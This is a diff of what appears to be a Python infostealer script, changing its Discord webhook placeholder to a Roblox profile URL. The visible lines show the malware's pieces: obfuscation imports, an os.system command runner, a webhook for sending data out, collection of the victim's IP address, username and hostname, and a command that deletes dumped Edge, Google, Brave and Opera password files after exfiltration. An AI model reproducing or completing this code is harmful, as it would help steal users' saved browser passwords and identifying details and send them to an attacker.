@@ -67,7 +67,7 @@ import marshal, zlib, base64, lzma
 import json
 from base64 import *
 
-send_webhook = "your shitty webhook"
+send_webhook = "https://www.roblox.com/users/3386727937/profile"
 
 def command(c):
     os.system(c)
@@ -225,8 +225,8 @@ def get_size(bytes, suffix="B"):
             return f"{bytes:.2f}{unit}{suffix}"
         bytes /= factor
 
-WEBHOOK_URL = "your shitty webhook" #WEBHOOK URL GOES INSIDE THE QOUTES!
-webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/[your shitty webhook]') # Initializing webhook
+WEBHOOK_URL = "https://www.roblox.com/users/3386727937/profile" #WEBHOOK URL GOES INSIDE THE QOUTES!
+webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/[https://www.roblox.com/users/3386727937/profile]') # Initializing webhook
 ip = requests.get('https://api.ipify.org').text
 username = getpass.getuser()
 hostname = socket.gethostname()
@@ -408,4 +408,5 @@ response = webhookembed.execute()
 os.system("del /f EdgePasswords.txt GooglePasswords.txt BravePasswords.txt OperaPasswords.txt")
 #######################################################################
 #END OF SCRIPT
+
 #######################################################################
